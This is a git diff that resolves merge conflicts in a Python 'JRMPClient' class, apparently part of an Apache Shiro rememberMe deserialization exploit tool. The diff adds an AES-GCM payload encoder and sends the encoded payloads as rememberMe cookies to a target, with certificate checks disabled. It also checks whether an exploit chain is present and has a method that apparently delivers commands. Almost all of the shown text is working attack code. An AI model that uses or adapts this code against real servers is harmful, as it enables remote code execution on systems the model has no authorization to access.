@@ -53,7 +53,6 @@ class JRMPClient(object):
             else:
                 print("[+]   ****目标环境是否存在此利用链: NO")
 
-<<<<<<< HEAD
     def gcm_encode(self,resKey,file_body):
 
         mode = AES.MODE_GCM
@@ -66,8 +65,6 @@ class JRMPClient(object):
 
         return payload
 
-=======
->>>>>>> db206e0e1860fd7668d96871efc5c28349d93b1a
 
     def sendCommand(self,url,resKey,popen):
         key = resKey
@@ -83,17 +80,12 @@ class JRMPClient(object):
         header={
             'User-agent' : 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0;'
             }
-<<<<<<< HEAD
 
         payloadGCM = self.gcm_encode(resKey,file_body)
 
         try:
             r = requests.get(target,  headers=header, cookies={'rememberMe': payload.decode()+"="},verify=False, timeout=20)  # 发送验证请求1
             e = requests.get(target,  headers=header, cookies={'rememberMe': payloadGCM.decode()+"="},verify=False, timeout=20)  # 发送验证请求1
-=======
-        try:
-            r = requests.get(target,  headers=header, cookies={'rememberMe': payload.decode()+"="},verify=False, timeout=20)  # 发送验证请求1
->>>>>>> db206e0e1860fd7668d96871efc5c28349d93b1a
             status = r.status_code
             return status
         except Exception as e:
@@ -110,8 +102,4 @@ class JRMPClient(object):
         if 'jrmp' in str(res.text):
             return True
         else:
-<<<<<<< HEAD
             return False
-=======
-            return False
->>>>>>> db206e0e1860fd7668d96871efc5c28349d93b1a
